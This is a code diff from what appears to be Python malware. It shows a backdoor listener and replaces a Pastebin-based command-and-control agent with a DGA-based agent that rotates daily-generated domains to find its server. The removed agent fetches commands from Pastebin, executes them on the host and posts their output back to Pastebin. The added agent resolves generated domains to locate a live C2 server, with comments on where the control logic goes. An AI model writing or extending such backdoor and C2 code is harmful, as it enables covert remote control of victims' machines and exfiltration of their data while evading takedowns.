@@ -135,39 +135,40 @@ def backdoor_listener(port, backdoor_password):
         logging.info(f"Connection from {addr}")
         threading.Thread(target=handle_client, args=(client_socket, backdoor_password)).start()
 
-def c2_agent(c2_url, sleep_interval=60):
+def dga_agent(seed, sleep_interval=3600):
     """
-    The main loop for the C2 agent. It polls a URL for commands.
+    The main loop for the DGA-based C2 agent.
     """
-    from modules.c2 import get_from_pastebin, post_to_pastebin
+    from modules.dga import generate_domains
+    import datetime
+    import socket
 
-    paste_id = c2_url.split('/')[-1]
-    logging.info(f"C2 agent started. Polling Pastebin ID: {paste_id}")
+    logging.info(f"DGA C2 agent started with seed: {seed}")
 
     while True:
-        try:
-            command = get_from_pastebin(paste_id)
-            if command and command.strip() != "waiting...":
-                logging.info(f"Received command: {command}")
+        today = datetime.date.today()
+        domains = generate_domains(seed, today)
 
-                # Execute the command
-                output = subprocess.getoutput(command)
+        for domain in domains:
+            try:
+                logging.info(f"Attempting to connect to C2 at {domain}...")
+                # In a real scenario, this would be a more sophisticated connection,
+                # e.g., an HTTPS request or a custom protocol.
+                # Here, we'll simulate by trying to resolve the domain.
+                c2_ip = socket.gethostbyname(domain)
 
-                # Post the output back to a new paste
-                response_title = f"Output for command: {command[:20]}"
-                response_url = post_to_pastebin(response_title, output)
+                logging.info(f"Successfully connected to C2 at {domain} ({c2_ip}).")
+                # --- Begin C2 Communication ---
+                # This is where you would implement the command and control logic,
+                # similar to the backdoor_listener, but over this connection.
+                # For now, we'll just log the success and break the loop.
+                print(f"Connected to C2 server at {domain}")
+                break # Found a live C2, no need to check more for today.
 
-                if response_url:
-                    # Clear the command paste by overwriting it
-                    # (This is a simplified approach)
-                    post_to_pastebin(f"Command executed. Output at {response_url}", "waiting...")
-                else:
-                    logging.error("Failed to post command output.")
+            except socket.gaierror:
+                logging.warning(f"Could not resolve C2 domain: {domain}")
+            except Exception as e:
+                logging.error(f"An error occurred while connecting to {domain}: {e}")
 
-            else:
-                logging.info("No new command found. Sleeping.")
-
-        except Exception as e:
-            logging.error(f"Error in C2 agent loop: {e}")
-
+        logging.info("DGA cycle complete. Sleeping until next cycle.")
         time.sleep(sleep_interval)
